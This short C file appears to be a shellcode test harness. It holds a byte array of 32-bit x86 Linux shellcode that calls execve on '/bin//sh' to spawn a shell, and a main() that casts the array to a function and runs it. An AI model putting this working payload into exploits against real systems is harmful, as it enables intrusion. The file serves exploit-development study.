#include <stdio.h>
#include <string.h>


char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\
					"\x6e\x89\xe3\x50\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
int main() {

	(*(void (*)()) shellcode)(); //Executes code from shellcode[]

	printf("\nExited normally.\n");
	return 0;
}
